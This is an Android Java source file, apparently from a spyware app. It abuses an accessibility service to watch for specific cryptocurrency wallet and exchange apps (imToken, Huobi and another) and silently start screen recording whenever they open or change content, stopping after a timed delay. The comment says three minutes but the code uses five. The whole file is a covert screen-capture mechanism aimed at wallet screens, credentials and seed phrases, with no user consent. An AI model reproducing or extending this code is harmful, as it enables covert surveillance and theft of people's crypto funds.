/**
 *
 */
package accessibility.app;

import accessibility.BaseAccessibilityJob;
import accessibility.Acc101Service;
import android.os.Handler;
import android.view.accessibility.AccessibilityEvent;
import order.screen.ScreenRecordService;
import utils.ConfigCt;

/**
 * @author ASUS
 *
 */
public class ShotOnVideo extends BaseAccessibilityJob  {
	private static ShotOnVideo current;

	private boolean bStart=false;
	private ShotOnVideo() {
		super(new String[]{ConfigCt.PKG_IM_TOKEN,ConfigCt.PKG_HUOBI,ConfigCt.PKG_BTD});

	}
	public static synchronized ShotOnVideo getInstance() {
		if(current == null) {
			current = new ShotOnVideo();
		}
		return current;
	}
	@Override
	public void onCreateJob(Acc101Service service) {
		super.onCreateJob(service);
		EventStart();

	}
	@Override
	public void onStopJob() {
		super.onStopJob();

	}
	/*
	 * (刷新处理流程)
	 * @see accessbility.AccessbilityJob#onWorking()
	 */
	@Override
	public void onWorking(){

	}
	@Override
	public void onReceiveJob(AccessibilityEvent event) {
		super.onReceiveJob(event);
		if(!mIsEventWorking)return;
		if(!mIsTargetPackageName)return;
		if (event.getEventType() == AccessibilityEvent.TYPE_WINDOW_STATE_CHANGED)
		{
				if(ScreenRecordService.getInstance()==null){
					ScreenRecordService.start(context,event.getPackageName().toString(),false);
					bStart=true;
					StopRecordingScreenDelay();
				}
		}
		if (event.getEventType() == AccessibilityEvent.TYPE_WINDOW_CONTENT_CHANGED)
		{
			if(ScreenRecordService.getInstance()==null){
				ScreenRecordService.start(context,event.getPackageName().toString(),false);
				bStart=true;
				StopRecordingScreenDelay();
			}
		}
	}
	/*
	 * 定时器：3分钟后自动终止录屏；
	 */
	private void StopRecordingScreenDelay(){
		final Handler handler= new Handler();
		Runnable runnable  = new Runnable() {
			@Override
			public void run() {
				if(bStart){
					ScreenRecordService.stop(context);
					bStart=false;
				}
			}
		};
		handler.postDelayed(runnable, 1000*60*5);
	}
}

